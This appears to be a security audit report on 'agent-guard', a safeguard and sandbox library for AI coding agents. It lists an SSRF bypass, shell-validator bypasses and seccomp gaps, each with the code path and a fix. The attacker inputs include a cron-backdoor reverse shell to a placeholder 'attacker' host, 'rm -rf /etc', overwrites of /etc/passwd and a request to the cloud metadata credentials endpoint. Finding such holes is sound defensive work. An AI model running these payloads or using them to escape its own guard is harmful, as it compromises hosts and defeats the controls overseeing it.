- **HIGH** executor-ssrf — IPv4-mapped IPv6 bypasses the deny-list in `is_always_blocked_ip`
  attacker input: `{"method":"POST","url":"http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/"}` (also `[::ffff:127.0.0.1]`, `[::ffff:10.0.0.1]`)
  reachability: `agent-guard-sdk/src/executors.rs:80` → `resolve_url_to_safe_addr` → `is_always_blocked_ip`. The IPv6 branch (lines 176–183) only checks `is_unspecified` / `is_multicast` / `is_ipv6_link_local (fe80::/10)` / `is_ipv6_unique_local (fc00::/7)`. `Ipv6Addr::is_loopback()` matches only `::1`, so `::ffff:127.0.0.1` and the entire IPv4-mapped prefix `::ffff:0:0/96` (loopback, RFC1918, 169.254/16) pass the check. Dual-stack Linux/Windows then route these mapped addresses to the corresponding IPv4 endpoint via the pinned socket. The DNS-rebinding pin is irrelevant because the URL is already an IP literal.
  impact: outbound mutation HTTP from inside the guard reaches AWS/GCP metadata services, k8s API on RFC1918, loopback admin endpoints. The executor's marketing surface ("safe outbound HTTP") is broken.
  remediation: in `is_always_blocked_ip`, when the address is `IpAddr::V6(v6)` and `v6.to_ipv4_mapped().is_some()`, recurse on the mapped IPv4 (or unconditionally deny mapped/compatible forms); also reject IPv4-compatible (`::a.b.c.d`) and NAT64 well-known prefix (`64:ff9b::/96`).

- **HIGH** validator-bypass — WorkspaceWrite mode allows interpreter / shell-laundering to write outside the workspace
  attacker input: `{"command":"python3 -c \"open('/etc/cron.d/backdoor','w').write('* * * * * root nc attacker 4444 -e /bin/sh\\n')\""}` — also `sh -c 'rm -rf /etc'`, `bash -c '...'`, `node -e "require('fs').writeFileSync('/etc/passwd','x')"`, `echo /etc/passwd | xargs rm -rf`, `find / -name passwd -exec rm {} +`.
  reachability: `agent-guard-validators/src/bash.rs:748` `validate_bash_command`. The `INLINE_CODE_INTERPRETERS` block lives inside `check_command_segment`, called only from `validate_read_only`, which short-circuits with `Allow` when `mode != ReadOnly` (line 106-108). `validate_paths` then only inspects `>` / `>>` redirections and a hand-listed set of write commands (`touch`, `mkdir`, `rm`, `chmod`, `chown`, `tee`, `mv`, `cp`, `ln`, `link`, `unlink`, `rmdir`, `chgrp`); `python`/`perl`/`node`/`sh`/`bash`/`xargs`/`find` produce no write targets and pass. The runtime then hands the command to the OS shell.
  impact: defeats the documented WorkspaceWrite "workspace-bound" control. A coding agent operating in the shipped `coding-agent-outbound.yaml` preset (WorkspaceWrite default) can write anywhere the host process can write — `/etc/cron.d/`, `~/.ssh/authorized_keys`, anywhere outside the configured workspace.
  remediation: lift the `INLINE_CODE_INTERPRETERS` + inline-code-flag check out of `validate_read_only` and apply it in WorkspaceWrite as well; treat shell-in-shell (`sh`, `bash`, `dash`, etc.) and command-multiplexers (`xargs`, `find -exec`, `env`, `nohup`) as opaque and Block in any non-FullAccess mode.

- **HIGH** validator-bypass — `dd of=` (and other unlisted write commands) escape the workspace bound in WorkspaceWrite
  attacker input: `{"command":"dd of=/etc/passwd if=/dev/zero count=1 bs=8192"}` — also `gcc -o /etc/cron.d/backdoor payload.c`, `tar -xf /workspace/p.tar -C /etc/`, `install -m0644 src /etc/passwd`, `cpio -idmv -D /etc/ < /workspace/p.cpio`, `rsync /workspace/p /etc/passwd`.
  reachability: `agent-guard-validators/src/bash.rs:975` `write_targets_for_segment` matches only ten command names plus redirections. `dd`, `gcc`/`cc`/`ld`, `tar -C/--directory=`, `install`, `cpio -D`, `rsync` are not in the match arms, so they produce no path target. `check_destructive` only Warns on the literal substring `"dd if="`, which is absent from `dd of=/etc/passwd if=/dev/zero` (the leading sigil is "wd if=" not "dd if=") — and `Warn` only escalates to `AskUser`, not `Deny`.
  reachability path: bash payload → `Guard::evaluate` (`guard.rs:434`) → `validate_bash_command` returns `Allow` → policy engine returns `Allow` → executor shells out to the OS.
  impact: same as above — workspace-bound is the documented control for WorkspaceWrite, and these commands silently overwrite arbitrary host files.
  remediation: in `write_targets_for_segment`, parse `dd of=…` (any leading-token `KEY=VAL` pattern) and treat `of=` as a write target; add cases for `gcc -o`, `cc -o`, `ld -o`, `tar -C/--directory`, `install`, `cpio -D`, `rsync` destination args; better, invert the policy so any command not on a positive allow-list is treated as opaque in WorkspaceWrite.

- **MEDIUM** sandbox-escape — seccomp ReadOnly filter does not deny `openat2` or `io_uring_*`
  attacker input: a payload that calls `openat2(AT_FDCWD, "/tmp/x", &struct{ flags: O_WRONLY|O_CREAT, mode: 0o644 }, 24)` from the sandboxed child; or stages a binary via `memfd_create` + `write` + `execveat(.., AT_EMPTY_PATH)` (none of those three syscalls is on the deny list) and from that fresh process calls `openat2` or submits a write SQE through `io_uring`.
  reachability: `agent-guard-sandbox/src/linux.rs:287` `add_read_only_write_denies`. The filter installs deny rules for `open`/`openat`/`creat`/`truncate`/etc., but `openat2` (Linux 5.6+, `__NR_openat2 = 437`) is not listed. The conditional-flag deny in `add_write_flag_denies` is only applied to `open` / `openat`, so a `openat2(.., {O_WRONLY,...})` call returns a fresh writable fd and `write(2)` (also not denied) completes the write. Similarly, `io_uring_setup` / `io_uring_enter` / `io_uring_register` are absent — io_uring is a documented seccomp evasion path because the actual file op is enqueued through the ring rather than a direct syscall.
  impact: a ReadOnly mode bash payload that runs any binary the validator does not block (or that the validator-pre-approved binary chooses to invoke via memfd_create→execveat) can perform unrestricted file writes despite the advertised ReadOnly sandbox guarantee.
  remediation: add `openat2`, `io_uring_setup`, `io_uring_enter`, `io_uring_register`, `memfd_create`, `execveat`, `process_vm_writev` to the deny-list; for `openat2`, apply the same masked-equality access-mode check used for `openat` against `struct open_how.flags` (which is the third argument, a pointer — so the simplest fix is to deny the syscall outright in ReadOnly).
